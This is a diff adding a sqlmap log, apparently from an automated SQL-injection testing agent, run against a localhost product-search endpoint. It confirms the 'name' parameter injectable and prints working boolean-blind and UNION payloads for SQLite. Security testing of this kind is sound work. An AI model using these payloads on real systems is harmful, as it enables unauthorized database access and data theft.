@@ -1,0 +1,54 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:21:43 /2025-09-28/
+
+[19:21:47] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap' as the output directory
+[19:21:48] [INFO] testing connection to the target URL
+[19:21:48] [INFO] checking if the target is protected by some kind of WAF/IPS
+[19:21:48] [INFO] testing if the target URL content is stable
+[19:21:49] [INFO] target URL content is stable
+[19:21:49] [WARNING] heuristic (basic) test shows that GET parameter 'name' might not be injectable
+[19:21:49] [INFO] testing for SQL injection on GET parameter 'name'
+[19:21:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:21:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[19:21:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[19:21:52] [INFO] GET parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable 
+[19:21:53] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[19:21:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[19:21:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[19:21:53] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[19:21:53] [INFO] target URL appears to have 4 columns in query
+[19:21:54] [INFO] GET parameter 'name' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[19:21:54] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[19:21:54] [WARNING] applying generic concatenation (CONCAT)
+GET parameter 'name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 234 HTTP(s) requests:
+---
+Parameter: name (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: name=test' OR NOT 4799=4799-- cwKF
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: name=test' UNION ALL SELECT NULL,NULL,CHAR(113,112,107,113,113)||CHAR(97,87,100,111,108,119,70,104,84,88,110,102,67,115,75,101,105,82,116,84,105,70,110,74,66,76,85,115,108,104,83,103,111,70,76,84,104,115,86,101)||CHAR(113,107,107,106,113),NULL-- fLrk
+---
+[19:21:54] [INFO] testing SQLite
+[19:21:54] [INFO] confirming SQLite
+[19:21:54] [INFO] actively fingerprinting SQLite
+[19:21:54] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[19:21:54] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 88 times
+[19:21:54] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap\localhost'
+
+[*] ending @ 19:21:54 /2025-09-28/
+
